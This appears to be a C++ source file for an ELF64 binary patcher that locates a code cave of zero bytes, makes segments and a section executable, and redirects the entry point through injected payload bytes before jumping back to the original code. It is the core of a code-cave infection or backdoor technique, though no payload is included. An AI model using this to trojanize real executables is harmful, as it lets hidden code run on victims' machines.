//
// Created by heeve on 01.11.20.
//

#include <iostream>
#include "utils.h"

// TODO: check if ImageBase is p_type 1
Elf64_Addr getImageBase(int fd, const Elf64_Ehdr &ehdr) {
    Elf64_Phdr phdr;

    lseek(fd, ehdr.e_phoff, SEEK_SET);  // go to program header offset

    // read all program headers to find the LOAD type header
    for (int i = 0; i < ehdr.e_phnum; ++i) {
        if (read(fd, &phdr, sizeof(phdr)) == -1) {
            std::cerr << "Error reading program header" << std::endl;
            exit(EXIT_FAILURE);
        }
        if (phdr.p_type == 1) {
            return phdr.p_vaddr;
        }
    }

    std::cerr << "Could not find image base" << std::endl;
    exit(EXIT_FAILURE);
}

void makeAllExec(int fd) {
    Elf64_Ehdr ehdr;
    Elf64_Phdr phdr;

    lseek(fd, 0, SEEK_SET);
    if (read(fd, &ehdr, sizeof(ehdr)) == -1) {
        std::cerr << "Error reading elf header" << std::endl;
        exit(EXIT_FAILURE);
    }  // read elf header

    lseek(fd, ehdr.e_phoff, SEEK_SET);  // go to program header offset

    // read all program headers to find the LOAD type header
    for (int i = 0; i < ehdr.e_phnum; ++i) {
        if (read(fd, &phdr, sizeof(phdr)) == -1) {
            std::cerr << "Error reading program header" << std::endl;
            exit(EXIT_FAILURE);
        }
        phdr.p_flags |= 1;
        lseek(fd, -sizeof(phdr), SEEK_CUR);
        write(fd, &phdr, sizeof(phdr));
    }
}

int findSectionNum(int fd, int ccStart, int ccEnd) {
    Elf64_Ehdr ehdr;
    Elf64_Shdr shdr;

    lseek(fd, 0, SEEK_SET);
    read(fd, &ehdr, sizeof(ehdr));

    for (int i = 0; i < ehdr.e_shnum; ++i) {
        lseek(fd, ehdr.e_shoff + (ehdr.e_shentsize * i), SEEK_SET);
        read(fd, &shdr, sizeof(shdr));
        if (ccStart < shdr.sh_offset) {
            return i - 1;
        }
    }
    std::cerr << "Could not find suitable section" << std::endl;
    exit(EXIT_FAILURE);
}

void setExecFlag(int fd, int secNum) {
    Elf64_Ehdr ehdr;
    Elf64_Shdr shdr;

    // TODO: add read and write error checks
    lseek(fd, 0, SEEK_SET);
    read(fd, &ehdr, sizeof(ehdr));

    // find offset of the given section and read it
    int sectionOffset = lseek(fd, ehdr.e_shoff + (ehdr.e_shentsize * secNum), SEEK_SET);
    read(fd, &shdr, sizeof(shdr));

    shdr.sh_flags |= 0x4;  // set the executable flag
    shdr.sh_size += 0x14;
    // write back the modified section
    lseek(fd, sectionOffset, SEEK_SET);
    write(fd, &shdr, sizeof(shdr));
}

void setEntryPoint(int fd, long address) {
    Elf64_Ehdr ehdr;

    lseek(fd, 0, SEEK_SET);
    if (read(fd, &ehdr, sizeof(ehdr)) == -1) {
        std::cerr << "Error reading elf header" << std::endl;
        exit(EXIT_FAILURE);
    }  // read elf header

    lseek(fd, 0, SEEK_SET);
    ehdr.e_entry = address;

    if (write(fd, &ehdr, sizeof(ehdr)) == -1) {
        std::cerr << "Error writing elf header" << std::endl;
        exit(EXIT_FAILURE);
    }  // write updated elf header
}


code_cave_t findCodeCave(int fd) {
    char buf[128];
    code_cave_t codeCave{};
    struct stat file_info{};
    int bytesRead, currentCave = 0;
    int bytesProcessed = 0;
    bool start = true;
    int prevOffset = 0;
    int addrStart = 0;

    codeCave.size = 0;
    lseek(fd, 0, SEEK_SET);
    if (fstat(fd, &file_info)) {
        std::cout << "Error while executing fstat()" << std::endl;
        exit(EXIT_FAILURE);
    }
    bytesRead = read(fd, buf, sizeof(buf));

    while (bytesRead > 0) {
        for (int i = 0; i < bytesRead; i++) {
            bytesProcessed++;
            if (buf[i] == 0) {
                if (start) {
                    addrStart = prevOffset + bytesProcessed;
                    start = false;
                }
                currentCave++;
            } else {
                if (currentCave > codeCave.size) {
                    codeCave.start = addrStart;
                    codeCave.size = currentCave;
                    codeCave.end = prevOffset + bytesProcessed;
                }
                currentCave = 0;
                start = true;
            }
        }
        prevOffset += bytesProcessed;
        bytesProcessed = 0;
        bytesRead = read(fd, buf, sizeof(buf));
    }
    return codeCave;
}

std::vector<char> hexToBytes(std::string hex) {
    std::vector<char> bytes;
    hex.insert(0, 8 - hex.size(), '0');
    for (unsigned int i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        char byte = (char) strtol(byteString.c_str(), NULL, 16);
        bytes.push_back(byte);
    }

    return bytes;
}

void injectCode(int fd, const code_cave_t &codeCave, int entryPoint, const Elf64_Ehdr &ehdr, int imgBase,
                const std::vector<unsigned char> &payload) {
    unsigned char jmp = 0xe9, nop = 0x90, call = 0xe8;
    unsigned char prologue[] = {0xf3, 0x0f, 0x1e, 0xfa, 0x31, 0xed};

    const int ccOffset = (codeCave.start + payload.size()) - (entryPoint + 0x5); // 0x5 - size of relative jump
    const int origOffset =
            (entryPoint + 0x5) -
            (codeCave.start + sizeof(prologue) + payload.size() + 0x5 + 0x5); // 0x5's for call and jmp
    const int payloadOffset = codeCave.start - (codeCave.start + payload.size() + 0x5);

    std::stringstream sStreamCC, sStreamOrig, sStreamPayload;
    sStreamCC << std::hex << htonl(ccOffset);
    sStreamOrig << std::hex << htonl(origOffset);
    sStreamPayload << std::hex << htonl(payloadOffset);

    std::vector<char> jumpToCCBytes = hexToBytes(sStreamCC.str());
    std::vector<char> jumpToOrigBytes = hexToBytes(sStreamOrig.str());
    std::vector<char> jumpToPayloadBytes = hexToBytes(sStreamPayload.str());

    std::cout << sStreamCC.str() << " " << sStreamOrig.str() << " " << sStreamPayload.str() << std::endl;

    lseek(fd, 0, SEEK_SET);

    // write jump to code cave
    lseek(fd, entryPoint - imgBase, SEEK_SET);
    write(fd, &jmp, sizeof(jmp));

    for (auto &j: jumpToCCBytes) {
        write(fd, &j, sizeof(j));
    }
    write(fd, &nop, sizeof(nop));

    // write prologue and jump to original code

    lseek(fd, codeCave.start - imgBase, SEEK_SET);
    write(fd, payload.data(), payload.size());

    write(fd, &call, sizeof(call));
    for (auto &j: jumpToPayloadBytes) {
        write(fd, &j, sizeof(j));
    }

    write(fd, prologue, sizeof(prologue));

    write(fd, &jmp, sizeof(jmp));
    for (auto &j: jumpToOrigBytes) {
        write(fd, &j, sizeof(j));
    }
}